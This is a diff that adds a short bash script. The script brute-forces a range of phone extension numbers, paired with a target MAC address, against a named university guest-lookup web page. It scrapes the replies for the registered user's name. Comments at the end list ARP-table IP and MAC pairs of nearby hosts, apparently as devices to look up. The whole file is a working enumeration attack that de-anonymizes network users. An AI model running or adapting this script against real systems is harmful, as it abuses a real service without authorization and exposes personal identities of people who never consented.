@@ -1,0 +1,36 @@
+#!/bin/bash
+tel1=54743000
+tel2=54745999
+mac=00:1b:73:23:31:6e
+if [ "$1" ]; then mac=$1; fi
+if [ "$2" ]; then tel1=$2; fi
+if [ "$3" ]; then tel2=$3; fi
+mac1=$(cut -d":" -f1 <<< $mac)
+mac2=$(cut -d":" -f2 <<< $mac)
+mac3=$(cut -d":" -f3 <<< $mac)
+mac4=$(cut -d":" -f4 <<< $mac)
+mac5=$(cut -d":" -f5 <<< $mac)
+mac6=$(cut -d":" -f6 <<< $mac)
+
+touch ip_mac_name.lock
+for i in $(seq $tel1 $tel2)
+do
+    echo -ne "\rtrying $i" 1>&2
+    if [ ! -f ip_mac_name.lock ]; then
+        exit 0
+    fi
+    curl -s -d "mac1=$mac1&mac2=$mac2&mac3=$mac3&mac4=$mac4&mac5=$mac5&mac6=$mac6&telenum=$i" \
+        'http://campus.sjtu.edu.cn/bx/guest/search.asp' \
+        | enca -L zh_CN -x utf8 \
+        | sed -e 's/<[^>]*>/ /g' -e '/^[ \t]*$/d' \
+        | grep '用户姓名' -A11 && rm ip_mac_name.lock &
+done
+
+echo -ne "\rsearch mac $mac failed" 1>&2
+#? (59.78.11.121) at 00:1f:d0:9d:14:55 [ether] on eth0
+#? (59.78.11.54) at 00:16:d3:30:6b:ca [ether] on eth0
+#? (59.78.11.30) at 00:16:d3:2a:3b:b7 [ether] on eth0
+#? (59.78.11.254) at 00:03:0f:0e:6d:34 [ether] on eth0
+#? (59.78.11.28) at 00:1d:72:44:4e:e2 [ether] on eth0
+#? (59.78.11.7) at 00:00:e2:90:91:58 [ether] on eth0
+#? (59.78.11.6) at 00:1b:38:9b:34:99 [ether] on eth0
